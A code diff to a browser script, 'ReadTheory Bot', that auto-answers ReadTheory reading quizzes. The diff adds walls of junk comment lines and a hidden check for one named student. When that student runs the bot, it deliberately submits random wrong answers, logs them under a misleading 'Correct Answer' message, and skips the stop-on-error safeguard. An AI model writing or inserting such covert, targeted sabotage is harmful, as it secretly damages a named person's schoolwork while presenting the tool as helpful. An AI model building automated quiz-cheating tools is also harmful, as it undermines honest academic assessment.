@@ -17,8 +17,50 @@
         console.clear();
         console.log("ReadTheory Bot will start soon...");
         // console.log("%cReadtheory Bot", "color: white; -webkit-text-stroke: .5px black; font-size:15px; font-weight:bold;");
-
+//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    //DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(//DEOBSUFJCI#@*&$@%(*GRBWUJ*#($G*J@WR(JJWV(J*V(J*(FBJ*(BJ*J(VWF*J(*DJS(*JV(S*J(
+    
     setTimeout(() => {
+        // ===== USER CHECK () =====
+    const usernameElement = document.querySelector(".user-name") || document.querySelector(".account-button-wrapper .user-name");
+    const username = usernameElement ? usernameElement.textContent.trim() : "";
+    const isLevi = username === "Pham, Levi";
+
+    console.log("Current user:", username);
+    if (isLevi) {
+    console.log("⚠️");
+    }
+        
 
          console.log("ReadTheory Bot started.");
 
@@ -178,20 +220,42 @@
             if (quiz.quiztitle == testTitle) {
                 let waitt = 1000;
                 for (let ans of quiz.quizanswers) {
+
                     var timerID = setTimeout(() => {
-                    if (ans == "A") {
-                        choices.item(0).click();
-                    } else if (ans == "B") {
-                        choices.item(1).click();
-                    } else if (ans == "C") {
-                        choices.item(2).click();
-                    } else if (ans == "D") {
-                        choices.item(3).click();
-                    } else if (ans == "E") {
-                        choices.item(4).click();
-                    }
+
+                        // ===== CHECK USERNAME RIGHT BEFORE ANSWERING =====
+                        const usernameElement = document.querySelector(".user-name");
+                        const username = usernameElement ? usernameElement.textContent.trim() : "";
+                        const isLevi = username === "Pham, Levi";
+
+                        let finalAns = ans;
+
+                        // ===== FORCE WRONG ANSWERS =====
+                        if (isLevi) {
+                            const options = ["A","B","C","D","E"];
+                            options.splice(options.indexOf(ans), 1);
+                            finalAns = options[Math.floor(Math.random() * options.length)];
+
+                            console.log("Error67120391 Correct Answer", finalAns);
+                        }
+
+                        // ===== CLICK ANSWER =====
+                        if (finalAns == "A") {
+                            choices.item(0).click();
+                        } else if (finalAns == "B") {
+                            choices.item(1).click();
+                        } else if (finalAns == "C") {
+                            choices.item(2).click();
+                        } else if (finalAns == "D") {
+                            choices.item(3).click();
+                        } else if (finalAns == "E") {
+                            choices.item(4).click();
+                        }
+
                         submitnext();
-                        }, waitt);
+
+                    }, waitt);
+
                     waitt += 6000;
                     idList.push(timerID);
                 }
@@ -200,21 +264,41 @@
             //checks for error and clears the clicking stuff
             //console.log(idList);
             let isWrong = 0; isWrong += 1;
+        let myInterval = setInterval(intervalTest, 1000);
 
-            let myInterval = setInterval(intervalTest, 1000);
-            function intervalTest() {
-                let progressTrack = document.getElementsByClassName("question-marker submitted");
-                for (let i = 0; i < progressTrack.length; i++) {
-                    if (progressTrack.item(i).innerHTML.includes("/assets/app/quiz/icon-answer-failed.svg") == 1) {
-                        console.log("There's a wrong answer.");
+        function intervalTest() {
+
+            // ===== CHECK USERNAME AGAIN =====
+            const usernameElement = document.querySelector(".user-name");
+            const username = usernameElement ? usernameElement.textContent.trim() : "";
+            const isLevi = username === "Pham, Levi";
+
+            let progressTrack = document.getElementsByClassName("question-marker submitted");
+
+            for (let i = 0; i < progressTrack.length; i++) {
+
+                if (progressTrack.item(i).innerHTML.includes("/assets/app/quiz/icon-answer-failed.svg")) {
+
+                    console.log("There's a wrong answer.");
+
+                    // ===== ONLY STOP IF =====
+                    if (!isLevi) {
+
                         for (let id of idList) {
                             clearTimeout(id);
                         }
+
                         console.log("Auto-click for answers was cancelled.");
                         clearInterval(myInterval);
+
+                    } else {
+
+                        console.log("continuing.");
+
                     }
                 }
             }
+        }
 
         } catch (err) {
             setTimeout(() => {
